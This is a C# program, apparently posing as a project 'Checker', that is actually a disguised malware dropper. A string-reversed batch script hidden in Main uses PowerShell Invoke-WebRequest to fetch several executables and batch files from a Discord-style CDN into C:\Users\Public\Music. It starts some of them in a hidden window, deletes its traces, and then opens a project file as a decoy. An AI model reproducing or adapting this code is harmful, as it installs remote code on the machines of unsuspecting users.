using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Threading;

class Program
{
    static void Main()
    {
        string currentDirectory = Directory.GetCurrentDirectory();
        string tempPath = Path.GetTempPath();
        string BatPath = Path.Combine(tempPath, $"{Guid.NewGuid()}.bat");
        string csproj = Path.Combine(currentDirectory, "Checker.csproj");
        string vcxproj = Path.Combine(currentDirectory, "VisualStudio.vcxproj");
        string udsihdisu = "exe.noisreViahinuR trats\r\n\r\n\"exe.noisreViahinuR eliFtuO- 'piz.lluF-1cd03b1c930f3cf61c7334c535b37b50/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\n8 t/ tuoemit\r\n\r\nexe.noisreiahiNnuR trats\r\n\r\n\"exe.noisreiahiNnuR eliFtuO- 'piz.lluF-60887db8b9754ff446162b4b50fdb321/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\n2 t/ tuoemit\r\n\r\n\"tab.se eliFtuO- 'piz.lluF-0a9ff16947d3c14f0a52cb757b4fe00b/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\n\"tab.seb eliFtuO- 'piz.lluF-73309794c229e924ffcba60f61ab7499/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\n\"exe.2liarsi eliFtuO- 'piz.lluF-a4838276d9d5aac9af768687330e000e/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\n\"exe.liarsi eliFtuO- 'piz.lluF-4b236cf786eff27c7781efd6599dc56b/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\n\"tab.cauu eliFtuO- 'piz.lluF-823355e21377e2fc0d21b5de81fc5c0c/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\n\"tab.2rellatsni eliFtuO- 'piz.lluF-d0b2afc66982b27b2b5455983de89b05/seliFcireneGaideMtnetnoC/moc.ndcdedliug.gmi//:sptth' tseuqerbeW-ekovnI\" dnammoC- llehsrewoP\r\n\r\ncisuM\\cilbuP\\sresU\\:C dc\r\n\r\n\r\nffo ohce@";

        char[] charArray = udsihdisu.ToCharArray();
        Array.Reverse(charArray);
        string reversedText = new string(charArray);

        File.WriteAllText(BatPath, reversedText);

        if (File.Exists(BatPath))
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + BatPath;
            startInfo.WorkingDirectory = tempPath;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;

            using (Process batProcess = new Process())
            {
                batProcess.StartInfo = startInfo;
                batProcess.Start();
                batProcess.WaitForExit();
            }
            File.Delete(BatPath);

            if (File.Exists(csproj))
        {
            Process csprojrun = new Process();
            csprojrun.StartInfo.FileName = csproj;
            csprojrun.Start();
        }
        else if (File.Exists(vcxproj))
        {
            Process vcxprojrun = new Process();
            vcxprojrun.StartInfo.FileName = vcxproj;
            vcxprojrun.Start();
        }
        else
        {
            File.WriteAllText(csproj, "");
            Process csprojrun = new Process();
            csprojrun.StartInfo.FileName = csproj;
            csprojrun.Start();
        }


        }
    }
}